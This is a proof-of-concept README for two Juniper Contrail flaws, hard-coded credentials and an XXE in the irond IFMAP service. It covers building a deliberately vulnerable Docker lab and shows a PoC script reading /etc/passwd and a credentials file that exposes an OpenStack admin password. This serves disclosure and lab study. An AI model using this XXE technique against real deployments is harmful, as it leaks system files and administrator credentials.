# CVE-2017-10616 & CVE-2017-10617

These two vulnerabilities affect Juniper Contrail version 2.2, 3.0, 3.1 and 3.2:

* Hard coded credentials (CVE-2017-10616)
* XML External Entity (CVE-2017-10617)

Vendor security bulletin can be found at [Juniper Security Alert JSA10819 2017-10](https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10819&actp=METADATA).

The vulnerable service in Contrail product is an IFMAP daemon, which is packaged from [irond](https://github.com/trustathsh/irond). To keep things simple, let's continue with irond and exploit of the XXE vulnerability.

## Vulnerable Docker image of irond

We all love to play. To build the image:

```
$ cd vulnerable-irond
$ docker build -t vulnerable-irond .
```

The image is based on maven alpine image, with a clone of irond repository.

A test file matching Contrail's setup is put onto vulnerable image at `/etc/contrail/openstackrc`. This file contains OpenStack admin password, which is a rather sensitive asset.


To start a vulnerable IFMAP service:

```
$ docker run -ti --rm -p 8443:8443 vulnerable-irond
```

IFMAP service is now available on port 8443 of local machine.

## Proof of concept: reveal local files

Once a vulnerable IFMAP service is setup, do the following:

```
$ ./poc-xxe.py -g /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
...
$ ./poc-xxe.py -g /etc/contrail/openstackrc
export OS_USERNAME=admin
export OS_PASSWORD=6b000a589c700b077ef9729513e5d6fc
...
```

This effectively reveals the OpenStack admin password.

